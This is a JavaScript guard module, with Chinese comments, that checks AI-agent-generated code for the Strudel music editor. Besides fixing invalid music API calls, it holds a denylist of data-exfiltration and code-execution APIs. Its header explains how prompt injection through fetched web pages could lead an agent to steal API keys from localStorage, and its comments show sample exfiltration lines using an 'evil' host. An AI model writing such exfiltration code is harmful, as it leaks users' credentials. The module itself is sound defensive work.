// codeGuard.mjs — agent 生成代码的静态安全护栏（纯模块，零外部依赖）。
//
// 为什么独立成模块：这段校验是阻止「提示注入 → 代码执行 / 数据外泄」的硬防线。
// agent 生成的代码经 editor.evaluate() 在页面 origin 内执行，而 origin 的 localStorage
// 里存着 API key（$modelConfig persistentMap）。read_web / wiki 等 web-research 工具会把
// 任意网页内容灌进模型上下文——恶意内容可诱导模型产出外泄代码。validateCode 在写入
// 编辑器前拦截。抽成纯模块（不依赖 editor / AI SDK / audio 图）是为了能用普通 node 单测
// 覆盖各种绕过手法（tools.mjs 因 superdough worklet 解析在 node 下无法 import）。
//
// 防护策略（denylist + 字符串扫描，均为静态、无副作用）：
//   1) DANGEROUS_PATTERNS：危险标识符 / 调用的正则黑名单（直接调用形态）。
//   2) 字符串字面量扫描：拦截 globalThis['fetch'] / window["localStorage"] /
//      Reflect.get(self,'eval') 这类用字符串绕过标识符黑名单的间接访问——合法 Strudel
//      pattern 的字符串里几乎不可能出现这些词，故整词匹配误报率极低。
// 注意：denylist 不是完美沙箱，是「显著抬高门槛」。彻底隔离需把 key 移出 localStorage
// （本项目无后端代理，权衡后保留持久化）再叠加这里的硬拦截。

// Strudel 里不存在、会触发 "is not defined" 的方法链。
const INVALID_METHODS = {
  reverb: 'Use .room(0.7).size(0.8) for reverb',
  echo: 'Use .delay(0.5).delaytime(0.25).delayfeedback(0.7) for delay/echo',
  chorus: 'Not available in Strudel',
  flanger: 'Not available in Strudel',
  flange: 'Not available in Strudel',
  phaser: 'Use .phaser(0.5) as a parameter, not as a method chain',
  compressor: 'Use .compressor(0.5) as a parameter, not as a method chain',
  limiter: 'Not available in Strudel',
  wah: 'Not available in Strudel',
  eq: 'Not available in Strudel',
  distortion: 'Use .distort(0.5) instead',
  bitcrusher: 'Use .crush(8) for bit crushing',
  pitchShift: 'Use .fshift(100) for frequency shifting',
  slidedelta:
    'Use .deltaSlide(...) instead — Strudel uses camelCase (deltaSlide, not slidedelta). .slide() and .deltaSlide() are the valid slide controls.',
};

// Strudel 里不存在的独立函数。
// NOTE: setcps / setcpm / cpm 都是合法的（repl.mjs 导出 setcps & setcpm；cpm 是 control）。
const INVALID_FUNCTIONS = {
  func: 'Not a Strudel function',
  play: 'Use write_code to play, or just write the pattern',
  melody: 'Use note("c3 e3 g3") for melody',
  synth: 'Use .s("superpiano"), .s("sawtooth"), .s("supersaw") etc.',
  beat: 'Use s("bd sd hh oh") for drum beats',
  rhythm: 'Use s("bd sd hh oh") for rhythm patterns',
  pattern: 'Use s("bd sd") or note("c3 e3") to start a pattern',
};

// 危险 API 黑名单：在「去注释、保留字符串」的代码上匹配。注释里的危险词不误报，
// 但 eval / Function 等执行原语、以及字符串内的外泄调用仍能被捕获。
const DANGEROUS_PATTERNS = [
  // ── 网络外发（数据外泄通道）──
  { re: /\bfetch\s*\(/, label: 'fetch()' },
  { re: /\bXMLHttpRequest\b/, label: 'XMLHttpRequest' },
  { re: /\bWebSocket\b/, label: 'WebSocket' },
  { re: /\bsendBeacon\b/, label: 'sendBeacon' },
  { re: /\bEventSource\b/, label: 'EventSource' },
  { re: /\bnew\s+Worker\b/, label: 'new Worker()' },
  { re: /\bimportScripts\b/, label: 'importScripts' },
  { re: /\bpostMessage\s*\(/, label: 'postMessage()' },
  // ── 存储 / 凭据（API key 落在 localStorage）──
  { re: /\blocalStorage\b/, label: 'localStorage' },
  { re: /\bsessionStorage\b/, label: 'sessionStorage' },
  { re: /\bdocument\.cookie\b/, label: 'document.cookie' },
  { re: /\bindexedDB\b/, label: 'indexedDB' },
  // ── 代码执行原语 ──
  // eval 用裸标识符 \beval\b（而非 \beval\s*\()：覆盖 (0,eval)、globalThis.eval、
  // const e=eval 等不带紧邻括号的绕过。合法代码里 eval 不会作为独立词出现
  // （"medieval" / "evaluate" 等因无词边界不被命中）。
  { re: /\beval\b/, label: 'eval' },
  // Function 不限 new——Function('...')() 不带 new 也是合法构造调用；\bFunction\s*\( 不会
  // 误伤 myFunction(（无词边界）、function 关键字（大小写）。
  { re: /\bFunction\s*\(/, label: 'Function()' },
  { re: /\bimport\s*\(/, label: 'dynamic import()' },
  // ── 隐式 eval / 定时器外发通道（字符串参数即等价 eval）──
  { re: /\bsetTimeout\s*\(/, label: 'setTimeout()' },
  { re: /\bsetInterval\s*\(/, label: 'setInterval()' },
  { re: /\bsetImmediate\s*\(/, label: 'setImmediate()' },
  { re: /\bqueueMicrotask\s*\(/, label: 'queueMicrotask()' },
  // ── 反射绕过（Reflect.get(self,'eval') 用字符串取到危险标识符）──
  { re: /\bReflect\s*\.\s*(get|construct|apply)\s*\(/, label: 'Reflect.get/construct/apply()' },
  // ── 图片 / 媒体外泄通道（new Image().src = 'https://evil/?key=...')──
  // design-issues 第十一节明确指出：Image 不在旧黑名单，是 prompt injection 外泄 API key 的主通道。
  { re: /\bnew\s+Image\b/, label: 'new Image()' },
  { re: /\bImage\s*\.\s*src\b/, label: 'Image.src' },
  // ── 重定向外泄（location.href = 'https://evil/?key=...')──
  { re: /\blocation\s*\.\s*(href|replace|assign)\s*([=(]|$)/, label: 'location redirect' },
  { re: /\bwindow\s*\.\s*open\s*\(/, label: 'window.open()' },
  // ── Worker 变体（SharedWorker / ServiceWorker 同样可跑脚本 + 联网）──
  { re: /\bSharedWorker\b/, label: 'SharedWorker' },
  // serviceWorker 小写 s（navigator.serviceWorker.register）；ServiceWorker 大写 S 罕见但一并覆盖
  { re: /\b[Ss]erviceWorker\b/, label: 'ServiceWorker' },
  // ── DOM 注入（document.write / innerHTML 可注入 <script> 外泄）──
  { re: /\bdocument\s*\.\s*write\s*\(/, label: 'document.write()' },
  { re: /\binnerHTML\s*=/, label: 'innerHTML=' },
  // ── Blob URL 外泄（URL.createObjectURL(new Blob([...])) + fetch/img.src)──
  { re: /\bURL\s*\.\s*createObjectURL\s*\(/, label: 'URL.createObjectURL()' },
  // ── 剪贴板读取（navigator.clipboard.readText() 偷用户剪贴板）──
  { re: /\bnavigator\s*\.\s*clipboard\b/, label: 'navigator.clipboard' },
];

// 危险词出现在字符串字面量里 → 多半是 globalThis['fetch'] 这类间接访问。
// 整词、大小写敏感匹配，误报率极低（见模块头注释）。
const DANGEROUS_IN_STRINGS = [
  'fetch', 'XMLHttpRequest', 'WebSocket', 'sendBeacon', 'EventSource',
  'localStorage', 'sessionStorage', 'indexedDB', 'importScripts',
  'setTimeout', 'setInterval', 'queueMicrotask', 'eval', 'Function',
  'Reflect', 'Worker', 'postMessage',
  // 新增外泄通道（配合 DANGEROUS_PATTERNS，拦截 globalThis['Image'] 等间接访问）
  'Image', 'SharedWorker', 'serviceWorker', 'createObjectURL', 'clipboard',
];
const _DANGEROUS_IN_STRINGS_RE = new RegExp(
  '\\b(' + DANGEROUS_IN_STRINGS.map((w) => w.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|') + ')\\b',
  'g',
);

// ─── 和弦符号记法（chord symbols）──────────────────────────────
// voicing() 用的字典（packages/tonal/ireal.mjs）是 iReal 爵士记号：大七 = ^7 / M7，
// 小七 = -7 / m7（voicings.mjs:227-243 给 ^/- 建了 M/m 别名）。模型常凭通用乐理写出
// maj7 / min7 / maj9 这类「全拼」记号——这些符号不在字典里，renderVoicing
// （tonleiter.mjs:144 `dictionary[symbol].map(...)`）访问 undefined 抛异常，而
// voicings.mjs:209-212 把异常静默吞掉返回 silence（不报错，只是没声）。结果：整层
// pad/keys 无声，agent 却以为播放成功。这里静态拦截这些错误记号，强制改用字典认的
// 记号（或改用显式音符数组 note("<[c3,e3,g3,b3]>")，永不静默失败）。
// 根音只匹配大写 A-G（引擎 tokenizeChord 要求大写），避免误伤普通单词。
const BAD_CHORD_SYMBOLS = {
  maj7: 'use ^7 or M7 (e.g. C^7, CM7)',
  min7: 'use -7 or m7 (e.g. D-7, Dm7)',
  maj9: 'use ^9 or M9',
  min9: 'use -9 or m9',
  maj13: 'use ^13 or M13',
  maj11: 'not in the default dictionary — use ^9 or ^7#11, or explicit note arrays',
  min11: 'use -11 or m11',
};
const BAD_CHORD_RE = new RegExp(
  '\\b([A-G][#b]?)(' + Object.keys(BAD_CHORD_SYMBOLS).join('|') + ')\\b',
  'g',
);

// ─── emoji 剥离（防御性兜底）──────────────────────────────────
// System Prompt 已要求注释不用 emoji，但模型未必遵守。此处作为写入编辑器前的硬性兜底：
// 无论模型行为如何，最终代码都不含 emoji。Strudel pattern 的合法 token 不含 emoji，
// 故全局剥离安全；剥离后若代码因此变无效，validateCode 会照常返回错误让模型重试。
// FE0F/200D/20E3 是 emoji 变体选择符 / ZWJ / 键帽组合符；在 /u 模式字符类里作为独立码点正确，
// no-misleading-character-class 对 /u 正则属误报，按规则建议就地禁用（正则行为不变）。
// eslint-disable-next-line no-misleading-character-class
const EMOJI_REGEX = /[\u{1F1E6}-\u{1F1FF}\u{1F300}-\u{1F5FF}\u{1F600}-\u{1F64F}\u{1F680}-\u{1F6FF}\u{1F700}-\u{1F77F}\u{1F780}-\u{1F7FF}\u{1F800}-\u{1F8FF}\u{1F900}-\u{1F9FF}\u{1FA00}-\u{1FA6F}\u{1FA70}-\u{1FAFF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}\u{2B00}-\u{2BFF}\u{2300}-\u{23FF}\u{FE0F}\u{200D}\u{20E3}]/gu;

export function stripEmojis(code) {
  return code.replace(EMOJI_REGEX, '');
}

// ─── 静态检查辅助：剥离注释与字符串 ──────────────────────────

// 只剥离 // 与 /* */ 注释，保留字符串字面量（字符串相关检查需要它们）。
function stripComments(code) {
  let out = '';
  let i = 0;
  const n = code.length;
  while (i < n) {
    const c = code[i];
    const next = code[i + 1];
    if (c === '/' && next === '/') {
      while (i < n && code[i] !== '\n') i++;
    } else if (c === '/' && next === '*') {
      i += 2;
      while (i < n && !(code[i] === '*' && code[i + 1] === '/')) {
        if (code[i] === '\n') out += '\n';
        i++;
      }
      i += 2;
    } else if (c === '"' || c === "'" || c === '`') {
      const quote = c;
      out += c;
      i++;
      while (i < n && code[i] !== quote) {
        if (code[i] === '\\' && i + 1 < n) {
          out += code[i] + code[i + 1];
          i += 2;
          continue;
        }
        out += code[i];
        i++;
      }
      if (i < n) {
        out += code[i];
        i++;
      }
    } else {
      out += c;
      i++;
    }
  }
  return out;
}

// 在已剥离注释的代码上，再把字符串字面量替换为等长空格（保留换行），
// 用于方法 / 函数名黑名单匹配，避免 mini-notation 字符串内容造成误报。
function stripStrings(code) {
  let out = '';
  let i = 0;
  const n = code.length;
  while (i < n) {
    const c = code[i];
    if (c === '"' || c === "'" || c === '`') {
      const quote = c;
      out += ' ';
      i++;
      while (i < n && code[i] !== quote) {
        if (code[i] === '\\' && i + 1 < n) {
          out += '  ';
          i += 2;
          continue;
        }
        out += code[i] === '\n' ? '\n' : ' ';
        i++;
      }
      if (i < n) {
        out += ' ';
        i++;
      }
    } else {
      out += c;
      i++;
    }
  }
  return out;
}

// 提取所有字符串字面量的内容（基于「仅去注释」的代码）。
// 用于检测危险词以字符串形式出现（间接访问绕过）。模板字符串里的 ${} 不递归——
// 那里若是真代码，DANGEROUS_PATTERNS 的直接匹配会兜住。
function _extractStringLiterals(code) {
  const out = [];
  const re = /(['"`])((?:\\.|(?!\1).)*)\1/g;
  let m;
  while ((m = re.exec(code)) !== null) {
    out.push(m[2]);
  }
  return out;
}

/**
 * 静态校验 agent 生成的代码。返回 warnings 数组（空 = 通过）。
 * 作用：拦截不存在的 Strudel API、危险执行 / 外泄原语、数组传参、多行字符串、
 * 缺 $: 多声部等。写入编辑器前调用；非空则拒绝写入并把提示回灌给模型自纠正。
 */
export function validateCode(code) {
  const warnings = [];

  // 方法 / 函数黑名单检查：在「无注释、无字符串」的代码上匹配，
  // 避免注释或 mini-notation 字符串里出现的方法名造成误报。
  const codeForNameCheck = stripStrings(stripComments(code));

  for (const [method, hint] of Object.entries(INVALID_METHODS)) {
    const regex = new RegExp(`\\.${method}\\s*\\(`, 'i');
    if (regex.test(codeForNameCheck)) {
      warnings.push(`.${method}() does not exist in Strudel — ${hint}`);
    }
  }
  for (const [name, hint] of Object.entries(INVALID_FUNCTIONS)) {
    const regex = new RegExp(`(?<!\\.)\\b${name}\\s*\\(`, 'i');
    if (regex.test(codeForNameCheck)) {
      warnings.push(`${name}() is not a Strudel function — ${hint}`);
    }
  }

  // 数组传参与多行字符串检查在「仅去注释」的代码上进行（需要保留字符串结构）。
  const noComments = stripComments(code);

  // 危险 API 扫描：在去注释、保留字符串的代码上匹配。
  for (const { re, label } of DANGEROUS_PATTERNS) {
    if (re.test(noComments)) {
      warnings.push(
        `${label} is blocked in agent-generated code for security (prevents a crafted tool result from exfiltrating data or running arbitrary code). This is a hard rule — rewrite the pattern without it.`,
      );
    }
  }

  // 间接访问检测：危险词出现在字符串字面量里（globalThis['fetch'] / window["localStorage"] /
  // Reflect.get(self,'eval')）。这是绕过上面标识符黑名单的主要手法。整词匹配避免误报。
  const strContents = _extractStringLiterals(noComments);
  const dangerousStrHits = new Set();
  for (const c of strContents) {
    for (const m of c.matchAll(_DANGEROUS_IN_STRINGS_RE)) {
      dangerousStrHits.add(m[0]);
    }
  }
  for (const w of dangerousStrHits) {
    warnings.push(
      `"${w}" inside a string is blocked — it looks like an indirect access to a restricted API (e.g. globalThis['${w}']). Rewrite the pattern without it.`,
    );
  }

  // 错误和弦符号：voicing() 字典不认 maj7/min7/maj9 这类全拼记号，会静默返回 silence。
  // 在字符串字面量里扫描（chord 符号只出现在 chord()/note() 的 mini-notation 串里）。
  const chordBadHits = new Map(); // 完整符号(如 "Cmaj7") -> 后缀(如 "maj7")
  for (const c of strContents) {
    for (const m of c.matchAll(BAD_CHORD_RE)) {
      chordBadHits.set(m[1] + m[2], m[2]);
    }
  }
  for (const [full, sym] of chordBadHits) {
    warnings.push(
      `Chord symbol "${full}" is not in the voicing dictionary — ${BAD_CHORD_SYMBOLS[sym]}. A wrong symbol makes .voicing() silently return silence (no error, just no sound). Use iReal notation (^7 M7 -7 m7 …) or explicit note arrays like note("<[c3,e3,g3,b3]>").`,
    );
  }

  if (/\bnote\s*\(\s*\[\s*/.test(noComments)) {
    warnings.push('note() expects a mini notation string like note("c3 e3 g3"), not an array');
  }
  if (/\bs\s*\(\s*\[\s*/.test(noComments)) {
    warnings.push('s() expects a mini notation string like s("bd sd hh"), not an array');
  }

  // 多顶层 pattern 检查（仅去注释）
  const topLevelPatterns = noComments.split('\n').filter(
    (line) => line.trim() && !line.trim().startsWith('$:') && !line.trim().startsWith('_$:'),
  );
  const patternStarts = topLevelPatterns.filter((line) =>
    /^\s*(note|s|n|freq|stack|cat|sequence|seq|slowcat|fastcat)\s*\(/.test(line),
  );
  if (patternStarts.length > 1) {
    warnings.push(
      'Multiple top-level patterns detected without $: prefix — only the LAST pattern will play. Use $: before each pattern to play them simultaneously.',
    );
  }

  // 多行字符串字面量检查（需要字符串，用仅去注释的代码）
  const lines = noComments.split('\n');
  let inString = false;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const quoteCount = (line.match(/(?<!\\)"/g) || []).length;
    if (inString) {
      if (quoteCount > 0 && quoteCount % 2 === 1) {
        inString = false;
      } else if (quoteCount % 2 === 0) {
        warnings.push(
          `Line ${i + 1}: Multi-line string literals are not valid in JavaScript. Keep all strings on a single line.`,
        );
        break;
      }
    } else if (quoteCount % 2 === 1) {
      inString = true;
    }
  }

  return warnings;
}
